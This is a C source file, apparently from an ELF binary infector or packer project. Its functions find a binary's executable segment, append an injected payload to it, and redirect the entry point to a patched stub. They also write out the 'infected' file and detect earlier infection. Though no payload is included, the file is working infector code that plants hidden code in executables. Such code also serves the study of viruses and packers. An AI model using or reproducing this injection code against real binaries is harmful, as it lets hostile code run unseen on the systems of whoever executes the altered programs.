#include "umbrella.h"

#define MAGIC_PAYLOAD_ADDR 0xAAAAAAAAAAAAAAAAULL
#define MAGIC_PAYLOAD_SIZE 0xBBBBBBBBBBBBBBBBULL
#define MAGIC_OLD_ENTRY    0xCCCCCCCCCCCCCCCCULL

/* ============================================================ 
   find_exec_segment
   ============================================================ */
Elf64_Phdr *find_exec_segment(void *map, size_t mapsize)
{
    Elf64_Ehdr *eh = map;
    if (!map || mapsize < sizeof(Elf64_Ehdr))
        return NULL;

    if (eh->e_phoff + eh->e_phnum * sizeof(Elf64_Phdr) > mapsize)
        return NULL;

    Elf64_Phdr *ph = (void *)((char *)map + eh->e_phoff);

    for (size_t i = 0; i < eh->e_phnum; i++)
        if (ph[i].p_type == PT_LOAD && (ph[i].p_flags & PF_X))
            return &ph[i];

    return NULL;
}

/* ============================================================ 
   align_size
   ============================================================ */
size_t align_size(size_t size, size_t align)
{
    return (align == 0) ? size : (size + align - 1) & ~(align - 1);
}

/* ============================================================ 
   patch_stub — nouvelle version compatible avec le stub actuel
   Patch les variables globales g_payload_addr / size / old_entry
   ============================================================ */
#include <stdint.h>
#include <stddef.h>
#include <string.h>

void patch_stub(unsigned char *stub, size_t stub_size, uint64_t payload_rel_off, uint64_t payload_size, uint64_t old_entry_rel_off)
{
    for (size_t i = 0; i < stub_size - 8; i++)
    {
        uint64_t *p = (uint64_t *)(stub + i);

        if (*p == MAGIC_PAYLOAD_ADDR)
            *p = payload_rel_off;

        else if (*p == MAGIC_PAYLOAD_SIZE)
            *p = payload_size;

        else if (*p == MAGIC_OLD_ENTRY)
            *p = old_entry_rel_off;
    }
}




/* ============================================================ 
   inject_payload
   ============================================================ */
int inject_payload(void *map, size_t mapsize, ElfInfo *info,
                   unsigned char *payload, size_t payload_size,
                   uint64_t *old_entry)
{
    if (!map || !info || !payload || payload_size == 0)
        return -1;

    Elf64_Ehdr *eh = (Elf64_Ehdr *)map;
    Elf64_Phdr *ph = (Elf64_Phdr *)((char *)map + eh->e_phoff);

    Elf64_Phdr *exec_ph = NULL;

    /* 1. Find the executable LOAD segment */
    for (int i = 0; i < eh->e_phnum; i++)
    {
        if (ph[i].p_type == PT_LOAD && (ph[i].p_flags & PF_X))
            exec_ph = &ph[i];
    }

    if (!exec_ph)
    {
        fprintf(stderr, "[-] No executable PT_LOAD segment found!\n");
        return -1;
    }

    if (old_entry)
        *old_entry = eh->e_entry;

    /* 2. Compute the injection offset */
    uint64_t stub_off   = exec_ph->p_offset + exec_ph->p_filesz;
    uint64_t stub_vaddr = exec_ph->p_vaddr  + exec_ph->p_filesz;

    /* 3. Alignment rules */
    size_t align = exec_ph->p_align ? exec_ph->p_align : 0x1000;
    size_t aligned_size = ((payload_size + align - 1) / align) * align;

    /* Safety */
    if (stub_off + aligned_size > mapsize)
    {
        fprintf(stderr, "[-] Not enough space in file for injection\n");
        return -1;
    }

    /* 4. Inject payload in executable segment */
    memcpy((char *)map + stub_off, payload, payload_size);

    if (aligned_size > payload_size)
        memset((char *)map + stub_off + payload_size, 0, aligned_size - payload_size);

    /* 5. Extend executable LOAD segment */
    exec_ph->p_filesz += aligned_size;
    exec_ph->p_memsz  += aligned_size;

    /* 6. Change entry point */
    eh->e_entry = stub_vaddr;

    /* 7. Fill info struct */
    info->seg_offset = stub_off;
    info->seg_vaddr  = stub_vaddr;

    return 0;
}

/* ============================================================ 
   write_infected_file
   ============================================================ */
int write_infected_file(const char *path, void *map, size_t size)
{
    int fd = open(path, O_CREAT | O_WRONLY | O_TRUNC, 0755);
    if (fd < 0)
        return -1;
    if (write(fd, map, size) != (ssize_t)size)
        return -1;
    return close(fd);
}

/* ============================================================ 
   already_infected (optionnel)
   ============================================================ */
int already_infected(void *map, ElfInfo *info)
{
    if (!map || !info)
        return 0;

    Elf64_Ehdr *eh = map;

    uint64_t expected_stub_entry =
        info->seg_vaddr + info->seg_filesz;

    return (eh->e_entry == expected_stub_entry);
}